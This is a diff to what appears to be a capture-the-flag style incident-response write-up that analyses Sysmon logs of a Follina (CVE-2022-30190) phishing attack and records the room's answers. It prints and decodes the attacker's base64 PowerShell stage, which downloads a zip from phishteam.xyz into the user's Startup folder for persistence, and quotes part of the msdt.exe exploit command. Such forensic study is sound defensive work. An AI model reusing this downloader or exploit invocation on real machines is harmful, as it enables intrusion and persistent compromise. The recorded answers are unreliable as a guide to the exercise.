@@ -51,19 +51,59 @@ Looking for Process Create events (Event ID 1) shortly after the download, we ca
 
 <img width="1068" height="209" alt="image" src="https://github.com/user-attachments/assets/6e069d3d-913c-4301-b12b-92c5fc99d4a5" />
 
-
 **Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?**
 > 167.71.199.191
 
+Looking at the DNS query events (Event ID 22) just before the malicious file was downloaded, one of the requested domains stands out: `phishteam.xyz`. The IP that it resolves to is given in the Query Results field
+<img width="577" height="186" alt="image" src="https://github.com/user-attachments/assets/d2b2f15f-6f66-49c0-86d1-939661592757" />
+
 **What is the base64 encoded string in the malicious payload executed by the document?**
 > JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
+
+To find this, we filter for events with ParentProcessID matching the PID of the Microsoft Word process that opened the malicious document (496), and we can see 6 results. Looking through the results, one of the entries has `Invoke-Expression` and `FromBase64String`, indicating execution from an obfuscated string
+
 
 **What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**
 *Format: XXXX-XXXXX*
 > 2022-30190
 
+I had to search for the start of the command: `C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param`. This showed me the Follina RCE Vulnerability, CVE 2022-30190
+
 ### Task 5: Initial Access - Stage 2 execution
+Now we can decode the base64, and look at the commands that it executes:
+`$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;`
+
+Line by line:
+`$app=[Environment]::GetFolderPath('ApplicationData')`: Set the AppData folder path to $app
+`cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"`: Change working directory to the Startup folder
+`iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip`: iwr is an alias for Invoke-WebRequest. This line downloads a payload from the same malicious domain we saw earlier
+`Expand-Archive .\update.zip -DestinationPath .`: Extracts the contents of the zip file payload that was just downloaded
+`rm update.zip`: Deletes the zip file
+
+This set of commands downloads a zip file to the Startup folder, extracts it, and then deletes the original archive, leaving the extracted file in the Startup folder.
+
+The task also gives us a few tips:
+- The Autostart execution reflects explorer.exe as its parent process ID.
+- Child processes of explorer.exe within the event timeframe could be significant.
+- Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.
+
 #### Task 5 Questions:
+**The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?**
+> C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+This is the path we found in the obfuscated string, we just had to replace $app with the full AppData path
+
+**The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**
+*Format: Remove the double quotes from the log.*
+>
+
+**Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?**
+>
+
+**The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?**
+*Format: domain:port*
+>
+
 ### Task 6: Initial Access - Malicious Document Traffic
 #### Task 6 Questions:
 ### Task 7: Discovery - Internal Reconnaissance
